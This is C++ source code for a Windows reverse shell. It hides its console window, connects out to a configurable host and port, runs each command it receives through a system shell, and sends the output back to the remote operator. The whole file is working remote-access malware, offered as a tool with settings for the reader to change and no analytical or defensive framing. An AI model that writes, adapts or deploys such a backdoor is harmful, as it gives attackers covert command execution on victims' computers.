#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <fstream>
#include <WinSock2.h>
#include <Windows.h>
#include <cstring>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <string>
#include <stdexcept>
#include <stdio.h>


using namespace std;

// You can change this variables
#define PORT 4444
#define HOST "127.0.0.1"


// Hide window of program
void hideWinow()
{
	HWND window = GetConsoleWindow();
	ShowWindow(window, SW_HIDE);
}


// Function for getting command output
string exec(string cmd)
{
	char bufferOut[4096];
	string dataSend = "";
	FILE* pipe = _popen(cmd.c_str(), "rt");																	// Creates process of shell

	if (!pipe) throw runtime_error("popen() failed!");														// Checking for errors of creating a pipe
	try {
		while (fgets(bufferOut, sizeof bufferOut, pipe) != NULL) {											// Get output
			dataSend += bufferOut;
		}
	}
	catch (...) {																							// Closing process pipe when error
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);																							// Closes pipe every time commands executes
	return dataSend;																						// Return result of command
}


int main()
{
	hideWinow();
	// Initialization of socket
	WSAData data;

	int dataResult = WSAStartup(MAKEWORD(2, 2), &data);														// Starts WSA

	if (dataResult != 0)		// Checking for errors
	{
		cerr << "[-] Can't start socket: " << dataResult << endl;

		return -1;
	}

	// if errors have not found program creates a socket
	else
	{
		// Creating Socket
		SOCKET connection = socket(AF_INET, SOCK_STREAM, 0);

		//Checking for errors of socket creation
		if (connection == INVALID_SOCKET)
		{
			cerr << "[-] Cannot create socket: " << WSAGetLastError() << endl;
			WSACleanup();
			return -2;
		}

		// if errors have not found program fills hint strucure
		else
		{
			// Fill hint strucure
			sockaddr_in hint;
			hint.sin_family = AF_INET;																			// Seets IPv4 protocol
			hint.sin_port = htons(PORT);																		// Sets port
			inet_pton(AF_INET, HOST, &hint.sin_addr);															// Convert address in standart presentation

			// Result of connection
			int connResult = connect(connection, (sockaddr*)&hint, sizeof(hint));								// Connect to host

			// If socket cannot reach host it clean up and close itself
			if (connResult == SOCKET_ERROR)
			{
				cerr << "[-] Cannot connect to server: " << WSAGetLastError << endl;							// Outputs last error of socket
				closesocket(connection);																		// Close connection
				WSACleanup();																					// Closes WinSocket
				return -3;																						// Code of error
			}

			// ------# SEND RECV DATA FROM SERVER AND EXECUTE COMMANDS #-------
			else
			{
				char buffer[4096];																				// Will contain commands
				string dataRecv = "";																			// Will contain output of command

				// ------#	MAIN LOOP WITH RECEIVE AND SEND #-------
				do
				{

					ZeroMemory(buffer, 4096);																	// Clears buffer with command
					int bytesRecv = recv(connection, buffer, 4096, 0);											// Gets input from server

					if (bytesRecv == SOCKET_ERROR)																// If error happens it will close connection and output error
					{
						cerr << "[-] Socket error " << endl;
						closesocket(connection);
						WSACleanup();
						exit(-5);
					}
					

					if (bytesRecv > 0)																			// If bytes that program received more than zero it 
					{
						dataRecv.append(buffer, bytesRecv);														// Variable that contains recieved data
						if (dataRecv.substr(0, 3) == "cd ")														// Checking does user want to change directory
						{
							string path = dataRecv.substr(3, dataRecv.length());								// Set path variable
							SetCurrentDirectory(path.c_str());													// Changes working directory
						}
						
						if (dataRecv.substr(0, 4) == "exit" or dataRecv.substr(0, 4) == "quit")					// Checking does user want to exit
						{
							closesocket(connection);															// Close connection and cleanup socket
							WSACleanup();
							cout << "Bye, Bye!\n";
							exit(0);
						}

						send(connection, exec(dataRecv).c_str(), 4096, 0);										// Send result of command
						printf(exec(dataRecv).c_str());															// Outputs in terminal
						dataRecv = "";																			// Clears received data
					}
				} while (true);

				closesocket(connection);
				WSACleanup();
				exit(0);
			}
		}
	}
}